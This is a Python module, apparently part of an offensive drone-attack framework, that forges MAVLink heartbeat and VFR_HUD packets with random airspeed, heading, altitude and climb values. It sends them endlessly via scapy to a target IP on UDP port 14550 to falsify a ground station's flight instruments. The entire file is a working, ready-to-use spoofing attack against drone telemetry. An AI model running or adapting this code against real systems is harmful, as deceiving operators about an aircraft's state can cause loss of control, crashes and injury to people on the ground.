from core.base import BaseModule
from pymavlink import mavutil
from scapy.all import *
import time
import random

class FlightInstrumentManipulationModule(BaseModule):
    def __init__(self):
        super().__init__(
            name="Flight Instrument Manipulation",
            description="Spoofs heartbeat and VFR_HUD messages with random values to manipulate flight instruments.",
            category="Instrument Deception"
        )
        self.options = {
            "target_ip": {"value": "", "required": True, "description": "Target IP address"},
            "target_port": {"value": 14550, "required": True, "description": "Target port"}
        }

    def create_heartbeat(self, mav):
        """
        Create a MAVLink heartbeat message.
        """
        heartbeat = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )
        return heartbeat.pack(mav)

    def create_vfr_hud(self, mav):
        """
        Create a MAVLink VFR_HUD message with random values.
        """
        airspeed = random.uniform(0, 20)
        groundspeed = random.uniform(0, 20)
        heading = random.randint(0, 360)
        altitude = random.uniform(0, 100)
        climb = random.uniform(-5, 5)

        vfr_hud = mav.vfr_hud_encode(
            airspeed=airspeed,
            groundspeed=groundspeed,
            heading=heading,
            throttle=0,
            alt=altitude,
            climb=climb
        )
        return vfr_hud.pack(mav)

    def run(self):
        target_ip = self.options["target_ip"]["value"]
        target_port = int(self.options["target_port"]["value"])

        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        while True:
            heartbeat_packet = self.create_heartbeat(mav)
            vfr_hud_packet = self.create_vfr_hud(mav)

            self.send_mavlink_packet(heartbeat_packet, target_ip, target_port)
            self.send_mavlink_packet(vfr_hud_packet, target_ip, target_port)
            
            print(f"Sent heartbeat and VFR_HUD packets to {target_ip}:{target_port}")
            time.sleep(1)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        send(packet)
